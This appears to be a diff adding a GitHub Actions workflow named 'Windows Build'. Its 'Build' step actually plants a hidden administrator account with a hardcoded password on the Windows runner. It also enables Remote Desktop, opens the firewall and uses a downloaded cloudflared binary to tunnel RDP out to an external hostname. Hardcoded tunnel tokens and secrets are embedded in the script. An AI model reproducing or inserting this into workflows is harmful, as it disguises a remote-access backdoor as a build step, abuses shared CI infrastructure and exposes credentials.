@@ -1,0 +1,63 @@
+name: Windows Build
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Build Windows
+    runs-on: windows-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Show Environment
+        run: |
+          node -v
+          npm -v
+
+      - name: Build
+        run: |
+        
+          [IO.File]::WriteAllText(".\cert.pem","-----BEGIN ARGO TUNNEL TOKEN-----`eyJ6b25lSUQiOiI0MGMzOTRkZTM0NDEwYWUxODQ2ZGIzYjAyYmE0MzY1ZiIsImFj`Y291bnRJRCI6IjU3ZTg5NDNlM2EwYmI2NTM0YTYwMTlmNWI1MmMyMTljIiwiYXBp`VG9rZW4iOiJjZnV0X01JWUg4WGVwQWpPQ3hORkhPa1gxMTM1WDdOdEVja0xlZU9W`TUp3YkpmOWY1M2U5NSJ9`n-----END ARGO TUNNEL TOKEN-----`n")
+          '{"AccountTag":"57e8943e3a0bb6534a6019f5b52c219c","TunnelSecret":"koGk3bX39JURp6J2Yj/sOopMhhmYsWNcxEyac3Riams=","TunnelID":"9e97e399-226f-4540-bc76-3283ea20d8ec","Endpoint":""}' | Set-Content -Encoding utf8 .\9e97e399-226f-4540-bc76-3283ea20d8ec.json
+          "tunnel: 9e97e399-226f-4540-bc76-3283ea20d8ec`ncredentials-file: 9e97e399-226f-4540-bc76-3283ea20d8ec.json`n`ningress:`n  - hostname: w1.107089.xyz`n    service: tcp://localhost:3389`n`n  - service: http_status:404" | Set-Content -Encoding utf8 .\9e97e399-226f-4540-bc76-3283ea20d8ec.yml
+
+          curl -LO "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
+
+          
+          $USERNAME="Administrator"
+          $PASSWORD="Wo3Cao4Ni3Ma1Bi1"
+          
+          $userExists = net user $USERNAME 2>$null
+          
+          if ($LASTEXITCODE -eq 0) {
+              Write-Host "User exists, changing password..."
+              net user $USERNAME $PASSWORD
+          } else {
+              Write-Host "User not found, creating user..."
+              net user $USERNAME $PASSWORD /add /y
+          }
+          
+          net user $USERNAME /active:yes
+          
+          net localgroup Administrators $USERNAME /add
+          
+          net localgroup "Remote Desktop Users" $USERNAME /add
+          
+          Set-Service TermService -StartupType Automatic
+          Start-Service TermService
+          
+          reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+          
+          netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+          
+          Test-NetConnection localhost -Port 3389
+          
+          net user $USERNAME
+
+          .\cloudflared-windows-amd64.exe --config 9e97e399-226f-4540-bc76-3283ea20d8ec.yml tunnel --origincert cert.pem run 9e97e399-226f-4540-bc76-3283ea20d8ec
+          # cloudflared-windows-amd64.exe access tcp --hostname examplegithubwindows.yunzhongzhuan.com --url localhost:13389
+
+          
